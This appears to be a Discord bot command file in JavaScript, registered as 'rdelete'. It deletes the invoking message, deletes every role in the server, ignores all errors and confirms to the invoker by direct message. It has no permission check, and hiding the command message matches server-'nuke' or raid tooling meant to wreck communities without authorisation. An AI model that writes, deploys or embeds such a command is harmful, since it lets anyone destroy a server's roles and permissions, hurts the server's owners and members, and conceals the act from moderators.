module.exports.run = async(client, message, args) => {
    message.delete();

    

    if(message.guild.roles.cache.size <= 1)return;
    message.guild.roles.cache.forEach(role => {
       role.delete().catch(err => {return;})
    });



    message.author.send("All roles deleted!")
}

module.exports.help = {
    name: "rdelete",
    aliases: []
}